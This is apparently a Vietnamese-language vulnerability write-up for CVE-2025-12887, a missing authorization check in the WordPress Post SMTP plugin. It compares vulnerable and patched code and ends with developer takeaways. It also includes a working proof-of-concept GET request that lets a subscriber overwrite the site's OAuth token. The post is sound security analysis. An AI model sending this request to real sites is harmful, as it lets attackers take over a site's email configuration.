---
title: CVE-2025-12887 Analysis & POC
description: Security Vulnerability in WordPress Post SMTP Plugin.
date: 2025-12-08 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, broken access control]
images: ["app.jpg"]
featuredImage: "app.jpg"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Post SMTP** cho **WordPress** dễ bị tấn công **vượt quyền xác thực** trong tất cả các **phiên bản** cho đến và bao gồm **3.6.1**. Nguyên nhân là do plugin không xác minh đúng cách rằng **người dùng** có được phép cập nhật **token OAuth** trong hàm **'handle_gmail_oauth_redirect'**. Điều này cho phép **kẻ tấn công** đã **xác thực**, với quyền truy cập từ cấp độ **người đăng ký** trở lên, chèn các **thông tin xác thực OAuth** không hợp lệ hoặc do **kẻ tấn công kiểm soát**.

* **CVE ID**: [CVE-2025-12887](https://www.cve.org/CVERecord?id=CVE-2025-12887)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 3.6.1
* **Patched Versions**: 3.6.2
* **CVSS severity**: Low (5.4)
* **Required Privilege**: Contributor
* **Product**: [WordPress Post SMTP Plugin](https://wordpress.org/plugins/post-smtp/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Post SMTP**:  
    * `3.6.1` – **vulnerable**  
    * `3.6.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đã đăng ký một action hook:

```php {title="NewWizard.php v3.6.1" data-open=true hl_lines=[]}
add_action( '`admin_init`', array( $this, 'handle_gmail_oauth_redirect' ) );
```

* **Hook `admin_init`**  
Đây là một hook trong WordPress được kích hoạt **mỗi khi một người dùng đã đăng nhập truy cập vào khu vực quản trị (admin area)**. Nó chạy sớm trong quá trình khởi tạo trang quản trị, trước khi bất kỳ nội dung nào được hiển thị.  

* **Đăng ký action**  
Plugin Post SMTP đã đăng ký hàm `handle_gmail_oauth_redirect` với hook `admin_init`:
Điều này có nghĩa là **bất kỳ người dùng nào đã đăng nhập** (kể cả với quyền thấp như *subscriber*) đều có thể kích hoạt hàm này khi truy cập vào trang quản trị.

**Trong phiên bản lỗi (v3.6.1):**

```php {title="NewWizard.php v3.6.1" data-open=true hl_lines=[21]}
public function handle_gmail_oauth_redirect() {
    // Check if the required OAuth parameters are present in the URL.
    if ( isset( $_GET['action'] ) && $_GET['action'] === 'gmail_oauth_redirect' ) {
        // Sanitize and retrieve URL parameters
        $access_token  = isset( $_GET['access_token'] ) ? sanitize_text_field( $_GET['access_token'] ) : null;
        $refresh_token = isset( $_GET['refresh_token'] ) ? sanitize_text_field( $_GET['refresh_token'] ) : null;
        $expires_in    = isset( $_GET['expires_in'] ) ? intval( $_GET['expires_in'] ) : 0;
        $msg           = isset( $_GET['msg'] ) ? sanitize_text_field( $_GET['msg'] ) : '';
        $user_email    = isset( $_GET['user_email'] ) ? sanitize_email( $_GET['user_email'] ) : '';
        $auth_token_expires = time() + $expires_in;

        if ( $access_token ) {
            $oauth_data = array(
                'access_token'      => $access_token,
                'refresh_token'     => $refresh_token,
                'auth_token_expires'=> $auth_token_expires,
                'vendor_name'       => 'google',
                'user_email'        => $user_email,
            );
            // Save the OAuth parameters to the WordPress options table.
            update_option( 'postman_auth_token', $oauth_data );
        }
    }
}
```

Logic của hàm `handle_gmail_oauth_redirect` cho thấy cách plugin Post SMTP xử lý việc nhận **OAuth token** từ Gmail. Tuy nhiên, có một số điểm yếu nghiêm trọng:
* Chỉ cần người dùng đã đăng nhập và truy cập vào trang quản trị với tham số `action=gmail_oauth_redirect` và `access_token` trong URL, logic update sẽ được gọi.
* Không có bất kỳ **kiểm tra quyền hạn (capability check)** nào để đảm bảo chỉ quản trị viên mới được phép thực hiện.

**Bản vá (v3.6.2):**

```php {title="NewWizard.php v3.6.1" data-open=true hl_lines=[6,11,16,38]}
public function handle_gmail_oauth_redirect() {
    // Check if the required OAuth parameters are present in the URL.
    if ( isset( $_GET['action'] ) && $_GET['action'] === 'gmail_oauth_redirect' ) {
        
    // Capability check: Only allow administrators to update OAuth tokens
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( esc_html__( 'You do not have sufficient permissions to access this page.', 'post-smtp' ) );
    }
    
    // CSRF protection: Verify nonce (required by security report)
    if ( ! isset( $_GET['_wpnonce'] ) || empty( $_GET['_wpnonce'] ) ) {
        wp_die( esc_html__( 'Security check failed. Nonce is missing.', 'post-smtp' ) );
    }
    
    // Verify the nonce
    $nonce = sanitize_text_field( $_GET['_wpnonce'] );
    if ( ! wp_verify_nonce( $nonce, 'gmail_oauth_redirect' ) ) {
        wp_die( esc_html__( 'Security check failed. Invalid nonce. Please try again.', 'post-smtp' ) );
    }
        
        // Sanitize and retrieve URL parameters
        $access_token  = isset( $_GET['access_token'] ) ? sanitize_text_field( $_GET['access_token'] ) : null;
        $refresh_token = isset( $_GET['refresh_token'] ) ? sanitize_text_field( $_GET['refresh_token'] ) : null;
        $expires_in    = isset( $_GET['expires_in'] ) ? intval( $_GET['expires_in'] ) : 0;
        $msg           = isset( $_GET['msg'] ) ? sanitize_text_field( $_GET['msg'] ) : '';
        $user_email    = isset( $_GET['user_email'] ) ? sanitize_email( $_GET['user_email'] ) : '';
        $auth_token_expires = time() + $expires_in;

        if ( $access_token ) {
            $oauth_data = array(
                'access_token'      => $access_token,
                'refresh_token'     => $refresh_token,
                'auth_token_expires'=> $auth_token_expires,
                'vendor_name'       => 'google',
                'user_email'        => $user_email,
            );
            // Save the OAuth parameters to the WordPress options table.
            update_option( 'postman_auth_token', $oauth_data );
        }
    }
}
```

Bản vá đã:

1. Kiểm tra quyền hạn (Capability check):
Chỉ administrator (người có quyền `manage_options`) mới được phép cập nhật **OAuth token**.

2. Bảo vệ CSRF bằng nonce:
Thêm **nonce verification** để đảm bảo request thực sự được tạo từ trang hợp lệ trong WordPress, ngăn chặn tấn công **CSRF (Cross-Site Request Forgery)**.

## Flow
{{< mermaid >}}
graph TD
A["Authenticated user (Subscriber or higher)"] 
--> B["Access admin area: /wp-admin/"]
--> C["admin_init hook is triggered"]
--> D["Post SMTP: handle_gmail_oauth_redirect() is executed"]
--> E{"Is GET[action] = gmail_oauth_redirect ?"}
E -- No --> F["Function exits – No impact"]
E -- Yes --> G["Read parameters from URL: access_token, refresh_token, expires_in, user_email"]
--> H{"Is access_token present ?"}
H -- No --> F
H -- Yes --> I["Build OAuth data array"]
--> J["update_option('postman_auth_token', oauth_data)"]
--> K["OAuth token is overwritten by attacker-controlled data"]
{{< /mermaid >}}

## Proof of Concept (PoC)
Gửi request bằng tài khoản **Subcriber+**:

```http
GET /wp-admin/?action=gmail_oauth_redirect&access_token=access_token_payload&refresh_token=refresh_to_payload&expires_in=expires_in_payload&user_email=user_email@gmail.com HTTP/1.1
Host: localhost
Cookie: subcriber+ cookie
```

## Conclusion

Lỗ hổng CVE-2025-12887 xuất phát từ việc plugin Post SMTP liên kết trực tiếp hàm `handle_gmail_oauth_redirect` vào hook `admin_init` mà không thực hiện bất kỳ kiểm tra quyền hạn hoặc cơ chế xác thực bổ sung nào. Điều này cho phép bất kỳ người dùng đã đăng nhập, kể cả với quyền thấp như **Subscriber/Contributor**, có thể gửi request tùy ý để ghi đè giá trị `postman_auth_token` trong bảng `options` của WordPress.

Việc thiếu **capability check** và **nonce verification** đã tạo ra một điểm yếu nghiêm trọng trong quy trình xử lý OAuth, dẫn đến nguy cơ chiếm quyền kiểm soát cấu hình gửi email của website. Bản vá ở phiên bản 3.6.2 đã khắc phục vấn đề bằng cách giới hạn quyền thực thi cho administrator và bổ sung kiểm tra nonce để ngăn chặn các request giả mạo.

## Key Takeaways

* Không bao giờ gắn các hành động nhạy cảm (như cập nhật token) vào hook chung như `admin_init` mà không kiểm tra quyền hạn người dùng.
* Luôn sử dụng `current_user_can()` để đảm bảo chỉ các vai trò phù hợp mới có thể thực hiện hành vi nguy hiểm.
* Bắt buộc triển khai **nonce verification** cho các request thay đổi trạng thái nhằm phòng chống CSRF.
* Không nên tin tưởng dữ liệu đến từ `$_GET` hoặc `$_POST` mà thiếu cơ chế xác thực và phân quyền rõ ràng.
* Việc cập nhật token OAuth cần được coi là hành động cấp quản trị và phải được bảo vệ tương đương các thay đổi quan trọng khác trong hệ thống.

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress Post SMTP Plugin <= 3.6.1 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/post-smtp/vulnerability/wordpress-post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-plugin-3-6-1-missing-authorization-to-authenticated-subscriber-oauth-token-update-vulnerability)